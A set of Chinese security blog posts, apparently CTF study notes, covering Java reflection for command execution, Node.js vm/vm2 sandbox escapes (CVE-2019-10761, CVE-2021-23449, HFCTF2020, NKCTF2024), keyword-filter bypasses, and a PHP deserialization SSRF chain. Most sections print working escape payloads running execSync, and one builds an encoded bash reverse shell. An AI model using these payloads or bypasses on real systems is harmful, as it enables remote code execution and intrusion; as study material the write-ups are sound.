m1=c.getMethod(\"exec\",String.class); Object i=m1.invoke(runtime,\"calc.exe\"); //过程同上 } }为什么这里不用Runtime runtime=new Runtime();来进行实例化，这个后面再说。 剩下的步骤的就不用多解释了，通过getClass()来获取类对象，从而用getMethod获取方法，在用反射进行调用来执行命令。 Class.forName()获得类 还可以直接通过Class.forName()反射获得类（根据给定的类名加载并返回对应的 Class 对象），通过反射调用方法getRuntime得到类的实例化，最后调用exec方法。 import java.lang.reflect.Method; //引入Method类 public class Main{ public static void main(String[] args) throws Exception{ //抛出异常就不说了 Class c=Class.forName(\"java.lang.Runtime\"); //获得类得class对象 Method m1= c.getMethod(\"getRuntime\",new Class[]{}); //利用getMethod获得getRuntime方法 Object runtime=m1.invoke(null); //利用反射来调用方法getRuntime Method m2=c.getMethod(\"exec\",String.class); //利用getMethod获得getRuntime方法 Object o=m2.invoke(runtime,\"calc.exe\"); //反射调用exec方法 } }null是因为getRuntime是静态方法，静态方法不用实例化的对象就能调用。 这样可以获得Runtime得实列化对象后就能调用exec方法了。 简写一下： public class Main{ public static void main(String[] args) throws Exception{ Object runtime=Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",new Class[]{}).invoke(null); Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc.exe\"); } }这样就不用引入Method类了（当然这里虽然获得实列化对象的效果一样，还是略有区别的）这里的实列化不能直接调用方法机进行命令执行runtime.exec(\"calc.exe\"); 想要直接调用方法还需要强制类型转换： public class Main{ public static void main(String[] args) throws Exception{ Object runtime=Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",new Class[]{}).invoke(null); Runtime run=(Runtime) runtime; run.exec(\"calc.exe\"); } }上面写了两种获得Class类的方法，一般是三种方法： obj.getClass()：获得实例化对象所属类的的类。 Class.forName：知道某个类的名字，想获取到这个类，直接用forName来获取。 Test.class：如果已经加载了某个类，只是想获取到它的java.lang.Class对象，可以直接拿到它的Class属性。这个方法其实不属于反射了。 综上所述，反射三要素：类的对象(类)，类的实列化对象，方法。 ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/:2:0","tags":["java"],"title":"java反射机制","uri":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"},{"categories":["javasec"],"content":"获得类的实列化对象 一、Class.newInstance获取 获得类的实例化对象一般使用Class.newInstance（虽然上面的例子是使用的是getRuntime方法），但很多情况下会失败，因为这个方法只能调用无参构造函数，对于一些类里面没有无参构造函数或者是私有属性的构造方法就会失败。 二、静态方法调用 上面的Runtime类就是一个例子，它的无参构造函数就是私有属性，但它是单列模式，可以通过静态方法getRuntime()调用其构造函数进行实例化（搞成私有属性利用方法进行调用的目的是为了防止建立多次数据库连接）。 但是对于一些于没有静态方法的又该怎么办呢。 三、getConstructor()函数 对于没有静态方法或者构造函数有参时可以用一个新的反射方法进行获取，getConstructor()(无参有参都可以获取) 和getMethod类似，getConstructor的接收参数是构造函数列表类型（因为构造函数也支持重载），获取到构造函数再使用newInstance来执行就可以获得类的实列化对象。 例如常用的另一种命令执行方式ProcessBuilder，使用反射来获取其构造函数，然后调用start来进行命令执行： import java.lang.reflect.Constructor; import java.util.Arrays; import java.util.List; public class Main{ public static void main(String[] args)throws Exception{ Class c=Class.forName(\"java.lang.ProcessBuilder\"); //获取类 Constructor con=c.getConstructor(List.class); //获得有参构造函数，如果要获得无参就什么都不用添 Object obj=con.newInstance(Arrays.asList(\"calc.exe\")); //进行实列化 ProcessBuilder pro = (ProcessBuilder) obj; //强制类型转换 pro.start(); //调用方法 } }全反射调用: import java.lang.reflect.Constructor; import java.util.Arrays; import java.util.List; public class Main{ public static void main(String[] args)throws Exception{ Class c=Class.forName(\"java.lang.ProcessBuilder\"); Constructor con=c.getConstructor(List.class); Object obj=con.newInstance(Arrays.asList(\"calc.exe\")); c.getMethod(\"start\").invoke(obj); //利用反射进行方法调用 } }进入ProcessBuilder类看见还有个有参构造方法，参数类型是ProcessBuilder(String... command)，即可变长参数 对于可变长参数，java在编译时会编译为一个数组，也就是说，下面写法底层上是等效的（不能重载） public void m1(String[] names){} public void m1(String... names){}因此对m1函数传参就直接传数组 String[] names={\"hello\",\"world\",\"!!!!\"}; m1(names)；所以还可以这样构造： import java.lang.reflect.Constructor; public class Main{ public static void main(String[] args)throws Exception{ Class c=Class.forName(\"java.lang.ProcessBuilder\"); Constructor con=c.getConstructor(String[].class); Object obj=con.newInstance(new String[][]{{\"calc.exe\"}}); //因为newInstance接受的参数是Object... args，所以这里传入的是二维数组，二维数组在处理是会当作一个整体对象处理 c.getMethod(\"start\").invoke(obj); } }或者把参数强制类型转换为object： import java.lang.reflect.Constructor; public class Main{ public static void main(String[] args)throws Exception{ Class c=Class.forName(\"java.lang.ProcessBuilder\"); Constructor con=c.getConstructor(String[].class); Object obj=con.newInstance((Object) new String[]{\"calc.exe\"}); //强制类型转换 c.getMethod(\"start\").invoke(obj); } }有参的构造方法大概就是这样了 当然这个类是可以直接调用的： public class Main{ public static void main(String[] args)throws Exception{ ProcessBuilder pro=new ProcessBuilder(\"calc.exe\"); pro.start(); } }四、getDeclared系列 构造函数为私有方法的解决办法： 这就涉及到getDeclared系列的反射了，与普通的 getMethod 、 getConstructor 区别是： getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了 getDeclaredMethod 的具体用法和 getMethod 类似， getDeclaredConstructor 的具体用法和 getConstructor 类似，不再赘述。 举个例子，上面说了Runtime的构造函数是私有方法，试一试： import java.lang.reflect.Constructor; public class Main { public static void main(String[] args) throws Exception { Class clazz = Class.forName(\"java.lang.Runtime\"); Constructor constructor = clazz.getDeclaredConstructor(); //获取私有的无参构造函数 constructor.setAccessible(true); //修改其作用域，必须的 Object runtime = constructor.newInstance(); //进行实例化 clazz.getMethod(\"exec\", String.class).invoke(runtime, \"calc.exe\"); //反射调用方法 } }jdk11虽然有很多报错但是还是能执行： jdk1.8（java8）就能完美执行： ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/:3:0","tags":["java"],"title":"java反射机制","uri":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"},{"categories":["javasec"],"content":"总结一下： 获取Class对象一般有三种方法Class.forName,obj.getClass,test.class 获取实列化类一般直接newInstance，失败就两种情况要么是有参构造函数，要么就是私有的。一般有静态调用方法就直接用方法，如：getRuntime,没有就Constructor配合newInstance，私有的就用getDeclared系列的反射 最后就是getMethod获取方法然后invoke进行调用方法。 ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/:4:0","tags":["java"],"title":"java反射机制","uri":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"},{"categories":["javasec"],"content":"利用反射一个重要目的就是绕沙盒机制（forName） 例如上下文只有intger类型的数字，怎么获得Runtime类 123.getClass().forNmae(\"java.lang.Runtime\"); forName有两个函数重载： Class\u003c?\u003e forName(String name) Class\u003c?\u003e forName(String name, **boolean** initialize, ClassLoader loader) 第一个就是我们最常见的获取class的方式，其实可以理解为第二种方式的一个封装： Class.forName(String name) //等于 Class.forName(Stirng name,true,currentLoder)默认情况下， forName 的第一个参数是类名；第二个参数表示是否初始化；第三个参数就 是 ClassLoader 。 ClassLoader 是什么呢？它就是一个“加载器”，告诉Java虚拟机如何加载这个类。 Java默认的 ClassLoader 就是根据类名来加载类， 这个类名是类完整路径，如 java.lang.Runtime 现在来说说第二个参数可能造成的漏洞： 第二个参数的意思是告诉java虚拟机是否执行“类初始化” 例子： public class Main { { System.out.println(\"1block initial\" + this.getClass()); } static { System.out.println(\"2initail\" + Main.class); } public Main() { System.out.println(\"3initial:\" + this.getClass()); } public static void main(String[] args) { Main main = new Main(); } }结果： 可以看到首先调用的是static{}，然后是{}，最后是构造函数{} static{}是在“类初始化”调用，而{}中的代码会在构造函数的super()后面，在当前构造函数前面 所以当有如下代码(name可控)： public void ref(String[] name)throws Exception{ Class.forName(name); }就可以构造个static{}的执行代码，例如： import java.lang.Runtime; import java.lang.Process; public class TouchFile { static { try { Runtime rt = Runtime.getRuntime(); String[] commands = {\"touch\", \"/tmp/success\"}; Process pc = rt.exec(commands); pc.waitFor(); } catch (Exception e) { // do nothing } } }那么就会在初始化类时执行代码。 ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/:5:0","tags":["java"],"title":"java反射机制","uri":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"},{"categories":["漏洞学习"],"content":"参考：https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD%2FQbiQQLcxA2%3D7YRieD\u0026alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6 参考：https://www.anquanke.com/post/id/237032#h3-4 ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:0:0","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"基础概念 ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:1:0","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"一、 1：JavaScript和Nodejs之间区别：JavaScript用在浏览器前端，后来将Chrome中的v8引擎单独拿出来为JavaScript单独开发了一个运行环境，因此写在后端（服务端）的JavaScript就叫叫做Nodejs。 **2：**在Nodejs中，我们可以通过引入vm模块来创建一个“沙箱”，但其实这个vm模块的隔离功能并不完善，还有很多缺陷，因此Node后续升级了vm，也就是现在的vm2沙箱，vm2引用了vm模块的功能，并在其基础上做了一些优化。 ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:1:1","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"二、 **nodejs作用域：**说到作用域，我们就要说一下Node中的作用域是怎么分配的（在Node中一般把作用域叫上下文） 在JavaScript中window是全局对象，浏览器其他所有的属性都挂载在window下，那么在服务端的Nodejs中和window类似的全局对象叫做global，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用global.xxx的方式来访问，直接用xxx就可以调用这个变量。举个例子，console就是挂载在global下的一个全局变量，我们在用console.log输出时并不需要写成global.console.log，其他常见全局变量还有process（一会逃逸要用到） ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:1:2","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"VM沙箱逃逸 ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:2:0","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"一、 关键函数： vm.runinThisContext(code)：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。 vm.createContext([sandbox])： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。（类似于把global变为了其他包，V8引擎变为了全局） vm.runInContext(code, contextifiedSandbox[, options])：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文（作用域）中执行，并且参数的值与沙箱内的参数值相同。 ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:2:1","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"二、 1：一般的VM沙箱逃逸 先看列子： const vm = require('vm'); const script = `m + n`; //反引号可以执行命令 const sandbox = { m: 1, n: 2 }; //给沙箱中传入对象 const context = new vm.createContext(sandbox); //创建沙箱上下文环境并将沙箱对象传递进来 const res = vm.runInContext(script, context); //沙箱内部的执行 console.log(res)执行: 这里命令是 `m+n` ，然后 context 是沙箱内的对象，如果对象改为 null 的话命令就执行不了了。 这种有对象的非常容易绕过 payload： const cc = this.toString.constructor('return process')() #通过指向sandbox（全局）的this拿到了process模块，然后通过this.toString拿到了toString函数，最后通过constructor拿到了所有函数的构造函数Function，然后通过return process拿到process模块。 cc.mainModule.require('child_process').execSync('whoami').toString() #拿到process模块后拿到子模块child_process，最后调用whoami命令执行的方法。 #execSync同步执行传入： 运行即可执行命令： 如果我们将this换成m和n也是访问不到的，因为数字，字符串，布尔这些都是primitive类型，他们在传递的过程中是将值传递过去而不是引用（类似于函数传递形参），在沙盒内使用的mn已经不是原来的mn了，所以无法利用（如果换为其他类型，如字典，数组就可以引用了）。 2：其他VM沙箱逃逸 示例1： const vm = require('vm'); const script = `...`; const sandbox = Object.create(null); const context = vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log('Hello ' + res)可以看到这里沙箱对象变为了null，没有可以引用的对象，所以this的方法无法使用了。 这时候想要逃逸我们要用到一个函数中的内置对象的属性arguments.callee.caller，它可以返回函数的调用者。 原理： 上面演示的沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法，这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的arguments.callee.caller就会返回沙箱外的一个对象（返回函数调用者），我们在沙箱内就可以进行逃逸了。 payload： (() =\u003e { const a = {} a.toString = function () { const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return process'))(); return p.mainModule.require('child_process').execSync('whoami').toString() } return a })()分析： 首先是创建了个箭头函数（为什么待会再说），再在函数里面创建了个对象a，给a对象创建了个toString方法（重写tostring方法）。重写的toString方法大概功能就是，给cc赋值为arguments.callee.caller获取的对象（类似于上面的this，就是获取个外部对对象），再拼接到p上，那么p的值就变为了process这个函数，再将p拼接到到最后，即可执行命令。（意思是可以直接全部拼接到一起）。最后箭头函数就是为了return a这个对象（也就是执行结果）。 arguments.callee.caller之所以会返回个对像，是因为沙箱外console.log中通过字符串拼接的方式调用了这个重写后的toString函数，触发arguments.callee.caller函数功能。 示例2： const vm = require('vm'); const script = `...`; const sandbox = Object.create(null); const context = new vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log(res.abc)没有了字符串拼接，但打印结果为res.abc，可以用Proxy来劫持属性： payload： (() =\u003e{ const a = new Proxy({}, { get: function(){ const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return process'))(); return p.mainModule.require('child_process').execSync('whoami').toString(); } }) return a })()分析： 也是为了调用外部对象。触发利用链的逻辑就是我们在get:这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行，实现了rce。 示例3： const vm = require('vm'); const script = `...`; try { vm.runInContext(script, vm.createContext(Object.create(null))); }catch(e) { console.log(e.message) }payload； throw new Proxy({}, { get: function(){ const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return process'))(); return p.mainModule.require('child_process').execSync('whoami').toString(); } })结合了示例2，因为throw了个错误，直接到了catch模块，然后console.log(e.message)触发钩子get:。（原理都大差不差了） ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:2:2","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"VM2沙箱逃逸 引用师傅们的基础 cli.js实现了可以在命令行中调用vm2 也就是bin下的vm2。 contextify.js封装了三个对象：Contextify Decontextify propertyDescriptor，并且针对global的Buffer类进行了代理。 main.js 是vm2执行的入口，导出了NodeVM VM这两个沙箱环境，还有一个VMScript实际上是封装了vm.Script。 sandbox.js针对global的一些函数和变量进行了拦截，比如setTimeout，setInterval等 vm2相比vm做出很大的改进，其中之一就是利用了es6新增的proxy特性，从而使用钩子拦截对constructor和__proto__这些属性的访问。 VM运行演示 const {VM, VMScript} = require('vm2'); const script = new VMScript(\"let a = 2;a;\"); console.log((new VM()).run(script));VM是vm2在vm的基础上封装的一个虚拟机，我们只需要实例化后调用其中的run方法就可以运行一段脚本。 （CVE-2019-10761） 该漏洞要求vm2版本\u003c=3.6.10 const {VM} = require('vm2'); const untrusted = ``; try{ console.log(new VM().run(untrusted)); }catch(x){ console.log(x); }payload: const f = Buffer.prototype.write; const ft = { length: 10, utf8Write(){ } } function r(i){ var x = 0; try{ x = r(i); }catch(e){} if(typeof(x)!=='number') return x; if(x!==i) return x+1; try{ f.call(ft); }catch(e){ return e; } return null; } var i=1; while(1){ try{ i=r(i).constructor.constructor(\"return process\")(); break; }catch(x){ i++; } } i.mainModule.require(\"child_process\").execSync(\"whoami\").toString()继续引用： 这条链子获取沙箱外对象的方法是 在沙箱内不断递归一个函数，当递归次数超过当前环境的最大值时，我们正好调用沙箱外的函数，就会导致沙箱外的调用栈被爆掉，我们在沙箱内catch这个异常对象，就拿到了一个沙箱外的对象 举个例子： 假设当前环境下最大递归值为1000，我们通过程序控制递归999次（注意这里说的递归值不是一直调用同一个函数的最大值，而是单次程序内调用函数次数的最大值，也就是调用栈的最大值）： r(i); // 该函数递归999次 f.call(ft); // 递归到第1000次时调用f这个函数，f为Buffer.prototype.write，就是下面图片的这个函数 this.utf8Write() // 递归到1001次时为该函数，是一个外部函数，所以爆栈时捕捉的异常也是沙箱外，从而返回了一个沙箱 外的异常对象 （CVE-2021-23449） const {VM} = require(\"vm2\"); let vmInstance = new VM(); let code = vmInstance.run(code); console.log(polluted);payload1： res = eval(\u0026#39;import(\\\\\u0026#39;./foo.js\\\\\u0026#39;);\u0026#39;) res.__proto__.__proto__.polluted = res.__proto__.__proto__.toString.constructor(\u0026quot;return this\u0026quot;)().process.mainModule.require(\u0026quot;child_process\u0026quot;).execSync(\u0026quot;touch HACKED\u0026quot;).toString();payload2： import('./foo.js') res.toString.constructor(\"return this\")().process.mainModule.require(\"child_process\").execSync(\"whoami\").toString();payload3： Symbol = { get toStringTag(){ throw f=\u003ef.constructor(\"return process\")() } }; try{ Buffer.from(new Map()); }catch(f){ Symbol = {}; f(()=\u003e{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString(); }这个就看参考好了，解释不出来。 （[HFCTF2020]JustEscape） \"use strict\"; const {VM} = require('vm2'); const untrusted = ''; try{ console.log(new VM().run(untrusted)); }catch(x){ console.log(x); }paylaod: (function(){ TypeError.prototype.get_process = f=\u003ef.constructor(\"return process\")(); try{ Object.preventExtensions(Buffer.from(\"\")).a = 1; }catch(e){ return e.get_process(()=\u003e{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString(); } })()这道题有关键字waf，用模板字符串拼接可以绕过 最终payload; (function (){ TypeError[`${`${`prototyp`}e`}`][`${`${`get_pro`}cess`}`] = f=\u003ef[`${`${`constructo`}r`}`](`${`${`return proc`}ess`}`)(); try{ Object.preventExtensions(Buffer.from(``)).a = 1; }catch(e){ return e[`${`${`get_pro`}cess`}`](()=\u003e{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString(); } })()","date":"2024-03-26","objectID":"/posts/nodejs-vm/:3:0","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"关键字绕过 ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:4:0","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"一、 nodejs命令执行 1：16进制编码 require(\"child_process\")[\"exe\\x63Sync\"](\"whoami\")2：unicode编码 require(\"child_process\")[\"exe\\u0063Sync\"](\"whomai\")3：加号拼接 require('child_process')['exe'%2b'cSync']('whoami')4：模板字符串拼接 require('child_process')${`${`exe`}cSync`}('curl 127.0.0.1:1234') require('child_process')[`${`${`exe`}cSync`}`]('curl 127.0.0.1:1234') //加不加中括号要取决于外面一层是否有反引号 5：concat连接 require(\"child_process\")[\"exe\".concat(\"cSync\")](\"curl 127.0.0.1:1234\")6：base64编码 eval(Buffer.from('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=','base64').toString()) ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:4:1","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"二、 上面提到的几种方法，最终思路都是通过编码或者拼接得到关键字，这一块考虑js的一些语法和内置函数。 1：Obejct.keys console.log(require('child_process').constructor===Object) //true Object.values(require('child_process'))[5]('curl 127.0.0.1:1234')利用Object.values就可以拿到child_process中的各个函数方法，再通过数组下标就可以拿到execSync 连起来用就是 require('child_process').constructor.values(require('child_process'))[5]('calc') 2：Reflect global[Reflect.ownKeys(global).find(x=\u003ex.includes('eval'))]('global.process.mainModule.constructor._load(\"child_process\").execSync(\"whoami\")')返回Reflect.ownKeys(global)所有函数，然后在所有函数中找到eval，这样拿到eval就不需要再去引入process模块了，eval里面就有 如果过滤了eval关键字，可以用includes('eva')来搜索eval函数，也可以用startswith('eva')来搜索 3：Reflect.get 如果中括号被过滤了， Reflect.get(target, propertyKey[, receiver])的作用是获取对象身上某个属性的值，类似于target[name] Reflect.get(global, Reflect.ownKeys(global).find(x=\u003ex.includes('eva'))) 等价于 global[Reflect.ownKeys(global).find(x=\u003ex.includes('eva'))]","date":"2024-03-26","objectID":"/posts/nodejs-vm/:4:2","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"NKCTF2024 ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:5:0","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"世界上最简单的CTF 主要源码： const vm = require('vm'); const script= ` ` const sandbox = Object.create(null); const context = new vm.createContext(sandbox); try { waf(script); // 调用 waf 函数对代码进行简单的安全检查 let result = vm.runInContext(script, context); // 在沙盒环境中执行代码 console.log(result); // 打印执行结果 } catch(e) { console.log(e.message); // 捕获可能的异常并打印错误消息 //在出现异常时尝试引入名为 hack 的模块 } function waf(script) { let pattern = /(prcess|\\[.*?\\]|exc|spawn|Buffer|\\+|concat|eval|Function)/g; if (script.match(pattern)) { throw new Error(\"what can I say? hacker out!!\"); } }可以看到有catch模块，可以用VM沙盒逃逸的示例3。 但有waf需要绕过，（这里字符串拼接或编码的方式都不行，也就是关键字绕过的一模块，因为会在waf的上一步就会自动解析出来，可以在waf时打印内容看看，所以只能用js的语法来绕过） paylaod1： throw new Proxy({}, { get: function(){ const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return global'))(); const a = Reflect.get(p, Reflect.ownKeys(p).find(x=\u003ex.includes('pro'))).mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)); return Reflect.get(a, Reflect.ownKeys(a).find(x=\u003ex.includes('ex')))(\"calc\"); } })用的Reflect绕过， 分析; 获取外部对象，拿到global，返回global全部函数，找到process，然后获得child_process，因为是字符串所以可以这样绕过（上面不是说了不能编码绕过吗？其实只要涉及到函数，就只有执行命令时才能解析出来。waf时解析是自动解析像无函数的编码，以及字符串拼接。那为什么不全这样绕过？这样只能绕过字符串，方法不能用这种方式绕过）。 payload2： throw new Proxy({}, { get: function(){ const cc = arguments.callee.caller; const aa = 'return Process'.toLowerCase(); const bb = 'child_pRocess'.toLowerCase(); const p = (cc.constructor.constructor(aa))().mainModule.require(bb); return Reflect.get(Reflect.get(p, Reflect.ownKeys(p).find(x=\u003ex.startsWith('ex')))('calc')); } })分析： 用的toLowerCase()函数（转小写）绕过了关键字字符串，然后用Reflect绕过方法。最后一句是个什么意思？ 等于： [p[Reflect.ownKeys(p).find(x=\u003ex.startsWith('ex'))]('calc')]可见最外面一层中括号不要也行（后面试了也确实可以）： payload3： throw new Proxy({}, { get: function(){ const content = `;)\"'}i-,hsab{|}d-,46esab{|}d-,46esab{|}9UkaKtSQElkMZpmTygzQORTRqxUeFpWT11EVOVXWE1Ee4M0YqJ1MMJjVHpldBlmSrE0UhRXQDFmeG1WW,ohce{' c- hsab\"(cexe;)\"ssecorp_dlihc\"(eriuqer = } cexe { tsnoc`; const reversedContent = content.split('').reverse().join(''); const c = arguments.callee.caller; const p = (c.constructor.constructor(`${`${`return proces`}s`}`))(); p.mainModule.require('fs').writeFileSync('/tmp/test1.js', reversedContent); return p.mainModule.require(`${`${`child_proces`}s`}`).fork('/tmp/test1.js').toString(); } })逆序内容： `const { exec } = require(\"child_process\");exec(\"bash -c '{echo,WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1EWXVOVE11TWpFeUxqRTROQzgyTmpZMklEQStKakU9}|{base64,-d}|{base64,-d}|{bash,-i}'\");`逆序+base64（但很神奇，这个模板字符串拼接竟然也行） 随便选一种都可以成功反弹shell： ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:5:1","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"redis主从复制 1redis是什么参考：https://www.cnblogs.com/testfan2019/p/11008297.html 一款内存高速缓存数据库， 最大的特点:快 2gopher协议是什么 Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处 gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议 Gopher协议格式：URL:gopher://:/_后接TCP数据流 其实感觉gopher协议就是可以发送数据流，在ssrf中这个协议类似可以传递数据命令。 3redis主从复制是什么 Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式 4为什么要用redis主从复制来getshell 随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了 所以可见并不是想用，是redis的另外三种方法都不行了才用的。 slaveof后面跟的是主服务器ip ","date":"2024-03-09","objectID":"/posts/rdis/:0:0","tags":["redis"],"title":"redis数据库主从复制","uri":"/posts/rdis/"},{"categories":["漏洞学习"],"content":"2023年春秋杯网络安全联赛冬季赛 ezezez_php \u003c?php highlight_file(__FILE__); include \"function.php\"; class Rd { public $ending; public $cl; public $poc; public function __destruct() { echo \"All matters have concluded\".\"\u003c/br\u003e\"; } public function __call($name, $arg) { foreach ($arg as $key =\u003e $value) { if ($arg[0]['POC'] == \"0.o\") { $this-\u003ecl-\u003evar1 = \"get\"; } } } } class Poc { public $payload; public $fun; public function __set($name, $value) { $this-\u003epayload = $name; $this-\u003efun = $value; } function getflag($paylaod) { echo \"Have you genuinely accomplished what you set out to do?\".\"\u003c/br\u003e\"; file_get_contents($paylaod); } } class Er { public $symbol; public $Flag; public function __construct() { $this-\u003esymbol = True; } public function __set($name, $value) { if (preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',base64_decode($this-\u003eFlag))){ $value($this-\u003eFlag); } else { echo \"NoNoNo,please you can look hint.php\".\"\u003c/br\u003e\"; } } } class Ha { public $start; public $start1; public $start2; public function __construct() { echo $this-\u003estart1 . \"__construct\" . \"\u003c/br\u003e\"; } public function __destruct() { if ($this-\u003estart2 === \"o.0\") { $this-\u003estart1-\u003eLove($this-\u003estart); echo \"You are Good!\".\"\u003c/br\u003e\"; } } } function get($url) { $url=base64_decode($url); var_dump($url); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); var_dump($result_info); curl_close($ch); var_dump($output); } if (isset($_POST['pop'])) { $a = unserialize($_POST['pop']); } else { die(\"You are Silly goose!\"); } ?\u003e You are Silly goose! 看起来有很多的类，但有用的就几个，刚看这道题的时候还是很迷的，以为从Poc类下手利用file_get_contents，但看了师傅们的wp发现根本没用，而且Have you genuinely accomplished what you set out to do?似乎也提示了。 这里的结尾是函数get，典型的ssrf，然后可以看到在Re类有把get赋值给变量，而给不存在的变量赋值可以触发set魔术方法，两个set，第一个完全是迷惑，第二个set是正确的。触发后，赋的值就是$vaule的值，所以直接就调用get方法了，那么怎么触发call呢？把对象当作函数，可以看到Ha类 $this-\u003estart1-\u003eLove($this-\u003estart);所以这里就是开始，链子 Ha::__destruct -\u003e Rd::__call -\u003e Er::__set -\u003e get exp 成功打到了get方法 可惜没环境了，最后的重点redis主从复制没办法复现。 参考：https://blog.csdn.net/mochu7777777/article/details/135760457 